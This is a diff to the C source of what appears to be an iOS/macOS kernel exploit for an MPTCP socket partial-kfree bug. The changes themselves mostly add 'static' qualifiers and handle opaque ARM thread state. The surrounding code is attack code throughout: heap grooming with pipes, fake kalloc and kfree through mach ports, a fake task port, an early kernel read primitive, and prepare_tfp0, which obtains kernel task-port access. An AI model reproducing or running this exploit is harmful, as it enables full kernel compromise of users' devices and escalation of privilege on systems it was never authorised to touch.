@@ -38,7 +38,7 @@ kern_return_t mach_vm_read_overwrite(
     mach_vm_address_t data,
     mach_vm_size_t* outsize);
 
-void increase_limits()
+static void increase_limits()
 {
     struct rlimit lim = { 0 };
     int err = getrlimit(RLIMIT_NOFILE, &lim);
@@ -66,7 +66,7 @@ void increase_limits()
 }
 
 #define AF_MULTIPATH 39
-int alloc_mptcp_socket()
+static int alloc_mptcp_socket()
 {
     int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
     if (sock < 0) {
@@ -77,7 +77,7 @@ int alloc_mptcp_socket()
     return sock;
 }
 
-void do_partial_kfree_with_socket(int fd, uint64_t kaddr, uint32_t n_bytes)
+static void do_partial_kfree_with_socket(int fd, uint64_t kaddr, uint32_t n_bytes)
 {
     struct sockaddr* sockaddr_src = malloc(256);
     memset(sockaddr_src, 'D', 256);
@@ -116,15 +116,15 @@ void do_partial_kfree_with_socket(int fd, uint64_t kaddr, uint32_t n_bytes)
     return;
 }
 
-char* aaaas = NULL;
+static char* aaaas = NULL;
 
-int read_fds[10000] = { 0 };
-int write_fds[10000] = { 0 };
-int next_read_fd = 0;
+static int read_fds[10000] = { 0 };
+static int write_fds[10000] = { 0 };
+static int next_read_fd = 0;
 
 #define PIPE_SIZE 0x7ff
 
-int alloc_and_fill_pipe()
+static int alloc_and_fill_pipe()
 {
     int fds[2] = { 0 };
     int err = pipe(fds);
@@ -155,7 +155,7 @@ int alloc_and_fill_pipe()
     return read_end; // the buffer is actually hanging off the read end struct pipe
 }
 
-int find_replacer_pipe(void** contents)
+static int find_replacer_pipe(void** contents)
 {
     uint64_t* read_back = malloc(PIPE_SIZE);
     for (int i = 0; i < next_read_fd; i++) {
@@ -183,7 +183,7 @@ int find_replacer_pipe(void** contents)
     return -1;
 }
 
-mach_port_t fake_kalloc(int size)
+static mach_port_t fake_kalloc(int size)
 {
     mach_port_t port = MACH_PORT_NULL;
     kern_return_t err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
@@ -221,7 +221,7 @@ mach_port_t fake_kalloc(int size)
     return port;
 }
 
-void fake_kfree(mach_port_t port)
+static void fake_kfree(mach_port_t port)
 {
     mach_port_destroy(mach_task_self(), port);
 }
@@ -276,7 +276,7 @@ static void build_fake_task_port(uint8_t* fake_port, uint64_t fake_port_kaddr, u
  */
 
 // size is desired kalloc size for message
-mach_port_t prealloc_port(natural_t size)
+static mach_port_t prealloc_port(natural_t size)
 {
     kern_return_t err;
     mach_port_qos_t qos = { 0 };
@@ -299,9 +299,9 @@ mach_port_t prealloc_port(natural_t size)
     return (mach_port_t)name;
 }
 
-mach_port_t extracted_thread_port = MACH_PORT_NULL;
+static mach_port_t extracted_thread_port = MACH_PORT_NULL;
 
-kern_return_t catch_exception_raise_state_identity(
+static kern_return_t catch_exception_raise_state_identity(
     mach_port_t exception_port,
     mach_port_t thread,
     mach_port_t task,
@@ -329,7 +329,11 @@ kern_return_t catch_exception_raise_state_identity(
 
     *new_stateCnt = old_stateCnt;
 
+#if __DARWIN_OPAQUE_ARM_THREAD_STATE64
+    new->__opaque_pc = (uint64_t)pthread_exit;
+#else
     new->__pc = (uint64_t)pthread_exit;
+#endif
     new->__x[0] = 0;
 
     // let the thread resume and exit
@@ -343,7 +347,7 @@ union max_msg {
 
 extern boolean_t exc_server(mach_msg_header_t* InHeadP, mach_msg_header_t* OutHeadP);
 
-void* do_thread(void* arg)
+static void* do_thread(void* arg)
 {
     mach_port_t exception_port = (mach_port_t)arg;
 
@@ -372,12 +376,12 @@ void* do_thread(void* arg)
     return NULL;
 }
 
-void prepare_prealloc_port(mach_port_t port)
+static void prepare_prealloc_port(mach_port_t port)
 {
     mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
 }
 
-int port_has_message(mach_port_t port)
+static int port_has_message(mach_port_t port)
 {
     kern_return_t err;
     mach_port_seqno_t msg_seqno = 0;
@@ -398,7 +402,7 @@ int port_has_message(mach_port_t port)
 }
 
 // we need a send right for port
-void send_prealloc_msg(mach_port_t port)
+static void send_prealloc_msg(mach_port_t port)
 {
     // start a new thread passing it the buffer and the exception port
     pthread_t t;
@@ -420,7 +424,7 @@ void send_prealloc_msg(mach_port_t port)
 
 // receive the exception message on the port and extract the thread port
 // which we will have overwritten with a pointer to the initial kernel r/w port
-mach_port_t receive_prealloc_msg(mach_port_t port)
+static mach_port_t receive_prealloc_msg(mach_port_t port)
 {
     kern_return_t err = mach_msg_server_once(exc_server,
         sizeof(union max_msg),
@@ -437,9 +441,9 @@ mach_port_t receive_prealloc_msg(mach_port_t port)
     return extracted_thread_port;
 }
 
-uint64_t early_read_pipe_buffer_kaddr;
-int early_read_pipe_read_end;
-int early_read_pipe_write_end;
+static uint64_t early_read_pipe_buffer_kaddr;
+static int early_read_pipe_read_end;
+static int early_read_pipe_write_end;
 static mach_port_t early_read_port;
 
 static mach_port_t prepare_early_read_primitive(uint64_t pipe_buffer_kaddr, int pipe_read_end, int pipe_write_end, mach_port_t replacer_port, uint8_t* original_contents)
@@ -509,7 +513,7 @@ static uint64_t early_rk64(uint64_t kaddr)
 
 // yes, this isn't the real kernel task port
 // but you can modify the exploit easily to give you that if you want it!
-mach_port_t prepare_tfp0(uint64_t vm_map, uint64_t receiver)
+static mach_port_t prepare_tfp0(uint64_t vm_map, uint64_t receiver)
 {
     uint8_t* pipe_contents = malloc(PIPE_SIZE);
     ssize_t amount = read(early_read_pipe_read_end, pipe_contents, PIPE_SIZE);
